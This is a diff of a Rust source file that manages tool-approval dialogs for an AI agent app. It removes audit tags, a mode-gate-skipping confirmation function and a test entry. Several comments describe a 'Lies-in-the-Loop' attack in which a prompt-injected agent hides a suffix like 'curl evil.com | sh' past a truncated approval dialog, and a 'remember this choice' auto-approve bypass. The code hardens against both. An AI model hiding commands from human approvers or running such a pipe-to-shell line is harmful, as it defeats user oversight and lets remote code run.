@@ -23,7 +23,7 @@ use tauri::{Emitter, Manager, State};
 use tokio::sync::oneshot;
 use tracing::{debug, info, warn};
 
-/// FIX-F6 (audit 2026-05-19): tools that MUST NEVER have a "remember this
+/// Tools that MUST NEVER have a "remember this
 /// choice" persisted. Closes the Lies-in-the-Loop class bypass where a user
 /// once clicking "Approve and remember" on a privileged-transition prompt
 /// (or any high-blast destructive tool) would silently auto-approve every
@@ -562,7 +562,7 @@ impl ToolConfirmationState {
     /// What Safe and Plan modes may run: the unattended read-only list, the
     /// chat-only reading and planning tools, and the two research tools.
     fn safe_and_plan_tools() -> impl Iterator<Item = &'static str> {
-        crate::core::agi::executor::UNATTENDED_READ_ONLY_TOOLS
+        crate::core::agent::tool_approval::UNATTENDED_READ_ONLY_TOOLS
             .iter()
             .chain(Self::CHAT_READ_AND_PLANNING_TOOLS)
             .chain(Self::ATTENDED_RESEARCH_TOOLS)
@@ -775,7 +775,7 @@ impl ToolConfirmationState {
     ///
     /// Returns `None` for tools that are not remember-eligible even when a
     /// row exists: migration v63 only purged the tools named in the original
-    /// FIX-F6 list, so a build that predates a later addition to
+    /// list, so a build that predates a later addition to
     /// [`NEVER_REMEMBERABLE`] can still carry a persisted "always allow" for
     /// it. Filtering on read makes the list authoritative for existing rows,
     /// not just for new writes.
@@ -788,7 +788,7 @@ impl ToolConfirmationState {
 
     /// Store a remembered choice for a tool (in-memory + persisted to SQLite).
     ///
-    /// FIX-F6 (audit 2026-05-19): silently a no-op (with a warn-level log)
+    /// Silently a no-op (with a warn-level log)
     /// when `tool_name` is in [`NEVER_REMEMBERABLE`]. Closes the LITL-class
     /// bypass where a single "Approve and remember" click on a privileged
     /// transition or destructive tool would silently auto-approve every
@@ -998,8 +998,7 @@ impl Default for ToolConfirmationState {
 
 /// Summary of a tool confirmation request for the frontend.
 ///
-/// FIX-F7 (audit 2026-05-19): began the Lies-in-the-Loop hardening. The
-/// legacy `parameters_summary` field truncates string values at 47 chars
+/// The legacy `parameters_summary` field truncates string values at 47 chars
 /// for the "compact" rendering, which let a prompt-injection-driven agent
 /// hide dangerous suffixes (e.g. `curl evil.com | sh`) past the visible
 /// scroll of the dialog. Two new fields are now populated alongside the
@@ -1028,11 +1027,11 @@ pub struct ToolConfirmationSummary {
     /// Legacy truncated-string rendering. Kept for back-compat. Frontend
     /// should migrate to `args` for untruncated structured display.
     pub parameters_summary: String,
-    /// FIX-F7: full canonical args, untruncated, sorted by key (BTreeMap
+    /// Full canonical args, untruncated, sorted by key (BTreeMap
     /// serialization is alphabetical). Frontend should render this.
     #[serde(default)]
     pub args: std::collections::BTreeMap<String, Value>,
-    /// FIX-F7: `sha256(canonical_json(args))` lowercase hex anti-tamper
+    /// `sha256(canonical_json(args))` lowercase hex anti-tamper
     /// fingerprint. Empty when args is empty.
     #[serde(default)]
     pub summary_hash: String,
@@ -1074,7 +1073,7 @@ impl From<&ToolConfirmationRequest> for ToolConfirmationSummary {
             req.parameters.to_string()
         };
 
-        // FIX-F7: canonical untruncated args + sha256 anti-tamper hash.
+        // Canonical untruncated args + sha256 anti-tamper hash.
         // BTreeMap serialization is alphabetical so the JSON byte sequence
         // is canonical (same args produce the same hash regardless of
         // input map iteration order).
@@ -1838,18 +1837,6 @@ pub fn get_agent_mode(state: State<'_, ToolConfirmationState>) -> Result<AgentMo
     Ok(state.get_agent_mode())
 }
 
-/// Per-tool approval policy: "ask", "always_allow", or "always_deny".
-///
-/// Stored as a remembered choice in the `ToolConfirmationState`.
-/// - `"always_allow"` → remembered as approved
-/// - `"always_deny"` → remembered as denied
-/// - `"ask"` → removes any remembered choice so the dialog appears
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct ToolApprovalPolicy {
-    pub tool_name: String,
-    pub policy: String,
-}
-
 /// Set the approval policy for a specific tool.
 ///
 /// Valid policies: `"ask"`, `"always_allow"`, `"always_deny"`. Always allow
@@ -2075,108 +2062,6 @@ impl<R: tauri::Runtime> ConfirmationSurface for ToolDialogSurface<'_, R> {
     }
 }
 
-/// Request confirmation for a user-initiated action, bypassing the agent-mode
-/// gate. Use this for configuration actions (e.g., MCP server connect from
-/// Settings) that should work regardless of the current agent mode.
-///
-/// Still respects auto-approve-all, remembered choices, and the 120-second
-/// confirmation dialog, just skips the Safe/Build/Autopilot mode check.
-pub async fn request_tool_confirmation_no_mode_gate(
-    app_handle: &tauri::AppHandle,
-    state: &ToolConfirmationState,
-    request: ToolConfirmationRequest,
-    timeout_secs: u64,
-) -> Result<bool, String> {
-    let request_id = request.request_id.clone();
-    let tool_name = request.tool_name.clone();
-
-    // Global auto-approve bypass
-    if state.is_auto_approve_all() && may_stand_on_a_prior_approval(&tool_name) {
-        debug!(
-            "[ToolConfirmation] Auto-approve-all active, skipping dialog for '{}'",
-            tool_name
-        );
-        return Ok(true);
-    }
-
-    // Check for remembered choice
-    if let Some(remembered) = state.get_remembered_choice(&tool_name) {
-        debug!(
-            "[ToolConfirmation] Using remembered choice for '{}': {}",
-            tool_name, remembered
-        );
-        return Ok(remembered);
-    }
-
-    // Check for session-scoped approval
-    if state.is_session_approved(&tool_name) {
-        debug!(
-            "[ToolConfirmation] Tool '{}' is session-approved, auto-approving (no mode gate)",
-            tool_name
-        );
-        return Ok(true);
-    }
-
-    let approval = crate::ui::hooks::lifecycle::PendingApproval::announce(&request).await;
-
-    // Register the pending confirmation
-    let rx = state.register_pending_request(&request);
-
-    // Create summary for frontend
-    let summary = ToolConfirmationSummary::from(&request);
-
-    // Emit the confirmation request event
-    if let Err(e) = app_handle.emit("tool:confirmation_required", &summary) {
-        state.cancel_pending(&request_id);
-        approval.resolve(false).await;
-        return Err(format!("Failed to emit confirmation event: {}", e));
-    }
-
-    info!(
-        "[ToolConfirmation] Waiting for user confirmation for '{}' (request_id: {})",
-        tool_name, request_id
-    );
-
-    let _waiting_on_user = crate::sys::commands::chat::state::UserWaitGuard::start();
-    let outcome = match tokio::time::timeout(std::time::Duration::from_secs(timeout_secs), rx).await
-    {
-        Ok(Ok(response)) => {
-            if response.remember_choice {
-                state.remember_choice(&tool_name, response.approved);
-            }
-            if response.approved {
-                info!("[ToolConfirmation] Tool '{}' approved by user", tool_name);
-            } else {
-                warn!(
-                    "[ToolConfirmation] Tool '{}' denied by user: {:?}",
-                    tool_name, response.reason
-                );
-            }
-            Ok(response.approved)
-        }
-        Ok(Err(_)) => {
-            state.cancel_pending(&request_id);
-            Err("Confirmation channel closed unexpectedly".to_string())
-        }
-        Err(_) => {
-            state.cancel_pending(&request_id);
-            let _ = app_handle.emit(
-                "tool:confirmation_timeout",
-                serde_json::json!({
-                    "request_id": request_id,
-                    "tool_name": tool_name,
-                }),
-            );
-            Err(format!(
-                "User did not respond within {} seconds",
-                timeout_secs
-            ))
-        }
-    };
-    approval.resolve(matches!(outcome, Ok(true))).await;
-    outcome
-}
-
 /// Folder access is a separate capability boundary from tool approval.
 /// It always requires an explicit point-of-use decision, even when global
 /// auto-approve or a session tool approval is active.
@@ -2277,7 +2162,7 @@ mod tests {
     fn test_tool_confirmation_state() {
         let state = ToolConfirmationState::new();
 
-        // FIX-F6 (audit 2026-05-19): the original fixture used "file_write"
+        // The original fixture used "file_write"
         // which is now on NEVER_REMEMBERABLE, `remember_choice` for those
         // tools silently no-ops by design. Switched to "file_read" (safe,
         // remember-eligible) to preserve the test's INTENT of verifying
@@ -2626,7 +2511,7 @@ mod tests {
         assert!(summary.parameters_summary.contains("content"));
     }
 
-    /// FIX-F7 (audit 2026-05-19): the new `args` field must contain the
+    /// The new `args` field must contain the
     /// FULL untruncated parameter values (in contrast to the legacy
     /// `parameters_summary` which truncates strings at 47 chars). The
     /// `summary_hash` must be deterministic regardless of input map
@@ -2827,7 +2712,6 @@ mod tests {
             "image_analyze",
             "image_ocr",
             "list_scheduled_tasks",
-            "llm_reason",
             "memory_recall",
             "memory_search",
             "question",
@@ -2891,10 +2775,6 @@ mod tests {
         ));
         assert!(ToolConfirmationState::is_tool_permitted_for_mode(
             "git_status",
-            AgentMode::Plan
-        ));
-        assert!(ToolConfirmationState::is_tool_permitted_for_mode(
-            "llm_reason",
             AgentMode::Plan
         ));
         assert!(ToolConfirmationState::is_tool_permitted_for_mode(
@@ -3222,7 +3102,7 @@ mod agent_mode_persistence_tests {
 
 #[cfg(test)]
 mod fix_f6_never_rememberable_alignment_tests {
-    //! FIX-F6 (audit 2026-05-19): pin the never-rememberable enforcement.
+    //! Pin the never-rememberable enforcement.
     //!
     //! Three layers:
     //! 1. `is_tool_remember_eligible` correctly inverts NEVER_REMEMBERABLE
